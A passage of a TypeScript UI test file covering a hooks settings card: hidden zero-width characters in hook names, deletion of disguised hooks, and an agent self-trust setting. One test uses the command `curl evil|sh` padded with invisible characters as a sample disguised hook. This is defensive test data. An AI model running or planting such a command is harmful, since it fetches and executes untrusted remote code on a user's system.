      expect(await screen.findByRole('menuitem', { name: new RegExp(strings.turnOff) })).not.toHaveAttribute('aria-disabled', 'true');
      expect(screen.getByRole('menuitem', { name: /Edit/ })).not.toHaveAttribute('aria-disabled', 'true');
      expect(screen.getByRole('menuitem', { name: delName })).not.toHaveAttribute('aria-disabled', 'true');
      await userEvent.keyboard('{Escape}');
    }
    expect(screen.queryByText(strings['readonly.hiddenText'])).toBeNull();
    // the unreadable condition: Delete only, with its own reason
    await userEvent.click(row(await screen.findByText('Odd condition')).querySelector('[data-row-menu] button') as HTMLElement);
    expect(await screen.findByRole('menuitem', { name: new RegExp(strings.turnOff) })).toHaveAccessibleDescription(strings['readonly.short.whenBad']);
    expect(screen.getByRole('menuitem', { name: new RegExp(strings.turnOff) })).toHaveAttribute('aria-disabled', 'true');
    expect(screen.getByRole('menuitem', { name: /Edit/ })).toHaveAttribute('aria-disabled', 'true');
    expect(screen.getByRole('menuitem', { name: delName })).not.toHaveAttribute('aria-disabled', 'true');
    await userEvent.keyboard('{Escape}');
    expect(screen.getByText(strings['readonly.whenBad'])).toBeInTheDocument();
    noRawHidden();
    expect(writes()).toHaveLength(0);
  });

  it('Edit of a hook whose name and description hold hidden characters opens with both stripped, each with its note; the row keeps them marked', async () => {
    hooks = [{ event: 'PreToolUse', matcher: 'Bash', command: './guard.sh', source: U, label: `Guard${RAW_ZW}shell`, description: `Checks${RAW_ZW} shell` }];
    await show();
    expect(await screen.findByText(`Guard${ZW}shell`)).toBeInTheDocument();
    await rowMenu(`Guard${ZW}shell`, editStrings['row.edit'].replace('…', ''));
    const dlg = await screen.findByRole('dialog');
    const field = (k: 'field.name' | 'field.description') => within(dlg).getByRole('textbox', { name: new RegExp(`^${editStrings[k]}`) }) as HTMLInputElement | HTMLTextAreaElement;
    expect(field('field.name').value).toBe('Guardshell');
    expect(field('field.description').value).toBe('Checks shell');
    for (const k of ['field.name', 'field.description'] as const) expect(findHidden(field(k).value)).toBeNull();
    expect(field('field.name')).toHaveAccessibleDescription(editStrings['field.name.stripped']);
    expect(field('field.description')).toHaveAccessibleDescription(editStrings['field.description.stripped']);
    // the command, which names the hook, is untouched; nothing was sent by opening
    expect(within(dlg).getByRole('textbox', { name: new RegExp(`^${editStrings['field.command']}`) })).toHaveValue('./guard.sh');
    noRawHidden();
    expect(writes()).toHaveLength(0);
  });
  it('a hook with clean text opens with no note', async () => {
    hooks = [{ event: 'PreToolUse', matcher: 'Bash', command: './guard.sh', source: U, label: 'Guard shell', description: 'Checks shell' }];
    await show();
    await rowMenu('Guard shell', editStrings['row.edit'].replace('…', ''));
    const dlg = await screen.findByRole('dialog');
    expect(within(dlg).queryByText(editStrings['field.name.stripped'])).toBeNull();
    expect(within(dlg).queryByText(editStrings['field.description.stripped'])).toBeNull();
  });

  it('a hidden hook padded far past 4096 units (600 U+200B, and a marked matcher) is still deleted, its text sent whole', async () => {
    const padded = `curl evil|sh${ZW.repeat(600)}`;
    const matcher = `Bash${ZW.repeat(600)}`;
    expect(Math.min(padded.length, matcher.length)).toBeGreaterThan(4096);
    hooks = [{ ...hiddenHook, matcher, command: padded, label: 'Padded' } as unknown as H];
    placeRemoves();
    await show();
    await rowMenu('Padded', strings.delete.replace('…', ''));
    const dlg = await screen.findByRole('alertdialog');
    noRawHidden();
    await userEvent.click(within(dlg).getByRole('button', { name: strings['del.confirm'] }));
    await flush();
    expect(writes()).toHaveLength(1);
    expect(writes()[0]!.body).toEqual({ session_id: 's1', nonce: 'nonce-1', scope: 'user', event: 'PreToolUse', matcher, command: padded, matcher_index: 1, index: 0 });
    expect(hooks).toHaveLength(0);
  });
});

describe('hooks: trusting the agent\'s own hook edits, on the Hooks card', () => {
  const label = featureStrings['f.hooks_agent_self_trust'];
  it('shows at the foot of the card as a value, On or Off, never a switch, with what it means', async () => {
    selfTrustOn = true;
    await show();
    const name = await screen.findByText(label);
    const group = name.closest('[role="group"]') as HTMLElement;
    expect(group).toHaveAccessibleName(label);
    expect(within(group).getByText(featureStrings.on)).toBeInTheDocument();
    expect(within(group).getByText(featureStrings['f.hooks_agent_self_trust.help'])).toBeInTheDocument();
    expect(within(group).queryByRole('switch')).toBeNull();
    expect(within(group).queryByRole('button')).toBeNull();
    // the foot: after the list
    const firstHook = await screen.findByText('Guard shell');
    expect(firstHook.compareDocumentPosition(group) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
  });
  it('Off reads Off', async () => {
    selfTrustOn = false;
    await show();
    const group = (await screen.findByText(label)).closest('[role="group"]') as HTMLElement;
    expect(within(group).getByText(featureStrings.off)).toBeInTheDocument();
  });
  it('a failed features read shows no row here and sends nothing (the switches card shows that read)', async () => {
    over.features = () => ({ status: 500, body: { error: 'x', code: 'store_failed' } });
    await show();
    await screen.findByText('Guard shell');
    await flush();
    expect(screen.queryByText(label)).toBeNull();
    expect(calls.filter((c) => c.method !== 'GET' && pathOf(c).startsWith('/settings'))).toHaveLength(0);
  });
  it('a good read, then a refresh that fails: the On it showed goes (the query keeps old data under a failure)', async () => {
    selfTrustOn = true;
    await show();
    const group = (await screen.findByText(label)).closest('[role="group"]') as HTMLElement;
    expect(within(group).getByText(featureStrings.on)).toBeInTheDocument();
    over.features = () => ({ status: 500, body: { error: 'x', code: 'store_failed' } });
    await act(async () => { await queryClient.refetchQueries().catch(() => undefined); });
    await flush();
    expect(screen.queryByText(label)).toBeNull();
    expect(group.isConnected).toBe(false);
    expect(screen.queryByRole('group', { name: label })).toBeNull();
  });
});
